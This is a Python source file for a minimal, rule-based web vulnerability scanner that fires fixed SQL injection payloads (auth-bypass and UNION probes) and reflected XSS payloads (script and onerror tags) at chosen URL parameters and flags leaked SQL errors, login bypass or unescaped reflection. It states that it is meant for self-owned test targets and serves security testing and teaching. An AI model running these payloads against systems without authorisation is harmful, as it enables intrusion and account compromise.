"""
Minimal, LLM-free, rule-based vulnerability auto-scanner.

Strix (AI-agent pentesting) uses an LLM to decide what to try next, and
can look for many vulnerability classes (SQLi, XSS, SSRF, auth bugs, ...).
This script replaces that decision-making with a fixed payload list PER
vulnerability class, and deterministic response checks -- no LLM, no
agent loop, no Docker. Adding a new class means adding a new entry to
VULN_CLASSES below: a payload list + a detect() function.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import sys
from dataclasses import dataclass, field
from typing import Callable

import requests

# --------------------------------------------------------------------------
# SQLi: same approach as auto_sqli_scanner.py
# --------------------------------------------------------------------------

SQL_ERROR_MARKERS = (
    "sql error",
    "sqlite3.operationalerror",
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "odbc sql server driver",
)

SQLI_PAYLOADS = [
    "' --",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1 --",
    "') OR ('1'='1' --",
    "' UNION SELECT NULL,NULL,NULL --",
    "'",
    '"',
]


def detect_sqli(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    text = resp.text.lower()
    if any(marker in text for marker in SQL_ERROR_MARKERS):
        return "error-based: SQL error leaked in response"

    baseline_looked_like_success = "login ok" in baseline.text.lower()
    if not baseline_looked_like_success and "login ok" in text:
        return "boolean/auth-bypass: baseline failed, payload succeeded"

    if resp.status_code != baseline.status_code:
        return f"status code changed ({baseline.status_code} -> {resp.status_code})"

    return None


# --------------------------------------------------------------------------
# Reflected XSS: payload reflected verbatim (unescaped) in the HTML body
# --------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]


def detect_xss(resp: requests.Response, baseline: requests.Response, payload: str) -> str | None:
    # If the exact payload (with its angle brackets/quotes intact) shows up
    # verbatim in the body, the app reflected it without HTML-escaping.
    if payload in resp.text:
        return "reflected: payload echoed back unescaped in HTML body"
    return None


# --------------------------------------------------------------------------
# Registry: add a new vulnerability class here
# --------------------------------------------------------------------------


@dataclass
class VulnClass:
    payloads: list[str]
    detect: Callable[[requests.Response, requests.Response, str], str | None]


VULN_CLASSES: dict[str, VulnClass] = {
    "sqli": VulnClass(SQLI_PAYLOADS, detect_sqli),
    "xss": VulnClass(XSS_PAYLOADS, detect_xss),
}


@dataclass
class Finding:
    param: str
    payload: str
    reason: str
    response_snippet: str = field(repr=False)


def probe(
    url: str, base_params: dict[str, str], param: str, payload: str
) -> requests.Response:
    params = dict(base_params)
    params[param] = payload
    return requests.get(url, params=params, timeout=10)


def scan(
    url: str, base_params: dict[str, str], fuzz_params: list[str], vuln_class: VulnClass
) -> list[Finding]:
    baseline = requests.get(url, params=base_params, timeout=10)

    findings: list[Finding] = []
    for param in fuzz_params:
        for payload in vuln_class.payloads:
            resp = probe(url, base_params, param, payload)
            reason = vuln_class.detect(resp, baseline, payload)
            if reason:
                findings.append(Finding(param, payload, reason, resp.text))

    return findings


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="e.g. http://127.0.0.1:5000/search")
    parser.add_argument(
        "--class",
        dest="vuln_class_name",
        required=True,
        choices=sorted(VULN_CLASSES),
        help="vulnerability class to test for",
    )
    parser.add_argument(
        "--baseline",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="known-benign baseline param, repeatable, e.g. --baseline q=zzz",
    )
    parser.add_argument(
        "--fuzz",
        action="append",
        required=True,
        help="param name to fuzz, repeatable, e.g. --fuzz q",
    )
    args = parser.parse_args()

    base_params = dict(kv.split("=", 1) for kv in args.baseline)
    vuln_class = VULN_CLASSES[args.vuln_class_name]

    print(f"Target: {args.url}")
    print(f"Vulnerability class: {args.vuln_class_name}")
    print(f"Baseline params: {base_params}")
    print(f"Fuzzing params: {args.fuzz}")
    print(f"Payload count: {len(vuln_class.payloads)}")
    print("-" * 60)

    findings = scan(args.url, base_params, args.fuzz, vuln_class)

    if not findings:
        print("No indicators found with this payload set.")
        return 0

    print(f"{len(findings)} finding(s):\n")
    for f in findings:
        print(f"  param={f.param!r} payload={f.payload!r}")
        print(f"    reason: {f.reason}")
        print()

    return 1


if __name__ == "__main__":
    sys.exit(main())
